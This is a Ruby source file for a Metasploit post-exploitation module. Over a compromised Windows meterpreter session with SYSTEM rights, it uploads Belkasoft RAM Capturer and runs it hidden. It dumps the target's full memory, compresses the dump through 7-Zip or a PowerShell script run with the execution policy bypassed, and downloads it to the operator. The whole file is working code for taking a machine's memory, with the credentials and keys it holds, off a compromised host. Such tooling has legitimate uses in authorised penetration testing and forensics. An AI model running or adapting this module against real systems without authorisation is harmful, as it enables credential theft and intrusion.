##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#
# This Module has an embred Belkasoft RAM Capturer version of 2018-08
# Available at https://belkasoft.com/ram-capturer
##
require 'tmpdir'
require 'msf/core/post/common'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Priv
  include Msf::Post::Common

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather Memory Dump Imaging',
      'Description'   => %q{This module will perform a memory dump of remote machine. This Module depends on Belkasoft RAM Capturer available at https://belkasoft.com/ram-capturer
      },
      'License'       => MSF_LICENSE,
      'Platform'      => ['win'],
      'Arch'          => [ ARCH_X86, ARCH_X64 ],
      'SessionTypes'  => ['meterpreter'],
      'Author'        => ['Helvio Junior (M4v3r1cK) <m4v3r1ck.hjr[at]gmail.com>'],
      'DisclosureDate'  => "Sep 15 2018"

    ))
    register_options(
      [
        OptPath.new('RAMCAPTURE_PATH',[true,'Path of Belkasoft RAM Capturer',''])
      ])
  end

  def run
    vprint_status("Determining session platform, type and privileges")
    case session.platform
    when 'windows'
      if session.type != "meterpreter"
        print_error "Only meterpreter sessions are supported on Windows hosts"
        return
      end
      @platform = :windows
    else
      print_error("Unsupported platform: #{session.platform}")
      return
    end

    unless got_root
        print_error("You need SYSTEM privileges for use this script")
        return
    end

    #Get Windows environment variables
    return unless get_env_vars

    print_status("Executing memory dump of #{@win_env_vars['arch']} system")

    send_and_execute
  end

  def get_env_vars
    @win_env_vars = {}
    
    env_vars = session.sys.config.getenvs('USERNAME','TEMP', 'SystemDrive', 'PROCESSOR_ARCHITECTURE', 'PROCESSOR_ARCHITEW6432')

    @win_env_vars['temp'] = env_vars['TEMP'] + "\\"
    @win_env_vars['system_drive'] = env_vars['SystemDrive']
    @win_env_vars['arch'] = 'x86'

    # i cant use client.arch because it referer to version of meterpreter client, and is safier use environment vars
    if env_vars['PROCESSOR_ARCHITECTURE'].nil? or env_vars['PROCESSOR_ARCHITECTURE'].empty?
        print_error("Was not possible to determine Windows Architherure (x86 oe x64)")
        return
    end

    if env_vars['PROCESSOR_ARCHITECTURE'] =~ /amd64/i
        @win_env_vars['arch'] = 'x64'
    end

    if env_vars['PROCESSOR_ARCHITEW6432'] =~ /amd64/i
        @win_env_vars['arch'] = 'x64'
    end

    true
  end

  def send_and_execute
    rnd = Rex::Text::rand_text_alpha(5..8)
    new_file = rnd + ".vmem"
    local_tmp = Dir::tmpdir + "/" + rnd
    @extension = ".vmem"
    
    @tmp_path = "#{@win_env_vars['temp']}#{rnd}"
    @mem_dump = "#{@tmp_path}\\#{new_file}"
    @mem_dump_comp = "#{@win_env_vars['temp']}\\#{rnd}"
    
    cmd = ""
    prog2check = ""

    print_warning("Sending file, this may take some time...")
    files = []

    unless session.fs.dir.mkdir(@tmp_path)
        print_error("Error creating remote temp directory #{tmp_path}")
        return
    end
    
    if @win_env_vars['arch'] == "x64"
      files.push('msvcp110.dll')
      files.push('msvcr110.dll')
      files.push('RamCapture64.exe')
      files.push('ramcapturedriver.cat')
      files.push('RamCaptureDriver64.sys')

      prog2check = 'RamCapture64.exe'
      
      ramcapture_path = datastore['RAMCAPTURE_PATH']

      files.each do |f|
        file = File.join(ramcapture_path, 'x64/' + f)

        if !File.exist?(file) or !File.file?(file)
          print_error("File not found: #{file}")
          print_ram_error
          return
        end

      end

      files.each do |f|
        file = File.join(ramcapture_path, 'x64/' + f)

        print_status("Uploading file #{@win_env_vars['temp']}#{f}")
        session.fs.file.upload_file(@win_env_vars['temp'] + f, file)  

      end

    else

      files.push('msvcp110.dll')
      files.push('msvcr110.dll')
      files.push('RamCapture.exe')
      files.push('RamCaptureDriver.sys')

      prog2check = 'RamCapture.exe'

      ramcapture_path = datastore['RAMCAPTURE_PATH']

      files.each do |f|
        file = File.join(ramcapture_path, 'x86/' + f)

        if !File.exist?(file) or !File.file?(file)
          print_error("File not found: #{file}")
          print_ram_error
          return
        end

      end

      files.each do |f|
        file = File.join(ramcapture_path, 'x86/' + f)
        print_status("Uploading file #{@win_env_vars['temp']}#{f}")
        session.fs.file.upload_file(@win_env_vars['temp'] + f, file)  
      end
      
    end

    print_status("Running #{prog2check}")
    print_warning("This may take some time...")
    r = session.sys.process.execute( @win_env_vars['temp'] + prog2check, @mem_dump,{'Hidden' => true})
    Rex.sleep(2)

    #check if is running
    found = 0
    while found == 0
      session.sys.process.get_processes().each do |x|
        found =1
        if prog2check.downcase == (x['name'].downcase)
          Rex.sleep(0.5)
          found = 0
        end
      end
    end
    r.close

    unless session.fs.file.exist?(@mem_dump)
        print_error("Remote memory dump file #{@mem_dump} not found!")
        return false
    end

    print_status("Remote memory dump file saved at #{@mem_dump}")
    
    print_status("Memory dump size: #{session.fs.file.stat(@mem_dump).size}B")
    
    
    if compress?
      print_status("Compressed Memory dump size: #{session.fs.file.stat(@mem_dump_comp).size}B")
    else
      print_error("  Error compressing file")
      @mem_dump_comp = @mem_dump
      @extension = ".vmem"
    end
    
    print_status("Downloading memory dump to #{local_tmp}#{@extension}")
    session.fs.file.download_file(local_tmp + @extension, @mem_dump_comp)
    
    print_status("Downloading fineshed")

    true
  end

  def print_ram_error
    print_warning("This module depeds on Belkasoft RAM Capturer application available at https://belkasoft.com/ram-capturer")
    print_status("You need to download end extract the Belkasoft RAM Capturer at this system and set RAMCAPTURE_PATH option to ram capture path")
    print_status("For example: If the ram capture was extracted at /root/, this will have a structure of directories similar at showed bellow") 
    print_status("/root/")
    print_status("├── Ram_Capturer")
    print_status("│   ├── x64")
    print_status("│   │   ├── RamCapture64.exe")
    print_status("│   └── x86")
    print_status("│       └── RamCapture.exe")
    print_warning("At this case you need to set RAMCAPTURE_PATH to /root/Ram_Capturer") 
  end
  
  def compress?
    try_zip = true
    if has_7zip?
      @mem_dump_comp = @mem_dump_comp + ".7z"
      @extension = ".7z"
      try_zip = false
      print_status("Trying to compress #{@mem_dump} via 7zip")
      do_7zip
      
      unless session.fs.file.exist?(@mem_dump_comp)
        try_zip = true
      end
    end 
    
    if try_zip
      @mem_dump_comp = @mem_dump_comp + ".zip"
      @extension = ".zip"
      print_status("Trying to compress #{@mem_dump} via PowerShell")
      upload_exec_ps_script_zip
    end
    
    unless session.fs.file.exist?(@mem_dump_comp)
      return false
    end
    
    if session.fs.file.stat(@mem_dump_comp).size <= 1024
      return false
    end
    
    true
  end
  
  def got_root
    case @platform
    when :windows
      session.sys.config.getuid =~ /SYSTEM/ ? true : false
    else
      false
    end
  end

  def get_program_file_path
    get_env('ProgramFiles')
  end
  
  def has_7zip?
    file?("#{get_program_file_path}\\7-Zip\\7z.exe")
  end

  def upload_exec_ps_script_zip
    script = "$source = \"#{@tmp_path}\" \r\n"
    script += "$destination = \"#{@mem_dump_comp}\" \r\n"
    script += "New-Item -ItemType Directory -Force -Path $destination \r\n"
    script += "If(Test-path $destination) {Remove-item $destination} \r\n"
    script += "Add-Type -assembly \"system.io.compression.filesystem\" \r\n"
    script += "[io.compression.zipfile]::CreateFromDirectory($source, $destination) "
    tmp_path = "#{@win_env_vars['temp']}zip.ps1"
    print_status("  Script file uploaded to #{tmp_path}")
    write_file(tmp_path, script.encode("UTF-8"))
    print_warning("  Compressing file, this may take some time...")
    f = cmd_exec("cmd.exe /c powershell.exe -ExecutionPolicy ByPass -File \"#{tmp_path}\"", args=nil, time_out=3000000)
    
    true
  end

  def do_7zip
    program_file_path = get_program_file_path
    f = cmd_exec("#{get_program_file_path}\\7-Zip\\7z.exe a -tzip \"#{@mem_dump_comp}\" \"#{@mem_dump}\"", args=nil, time_out=3000000)
  end
  
end
